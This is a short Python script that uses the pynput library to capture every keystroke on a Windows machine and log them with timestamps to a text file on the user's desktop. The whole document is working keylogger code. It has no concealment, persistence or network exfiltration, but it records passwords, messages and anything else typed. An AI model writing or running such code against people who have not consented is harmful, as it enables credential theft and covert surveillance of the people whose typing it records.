import logging
import os
from pynput import keyboard

# create log file
desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
log_file = os.path.join(desktop_path, 'test_log1.txt')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function to handle key press event
def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

# create keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()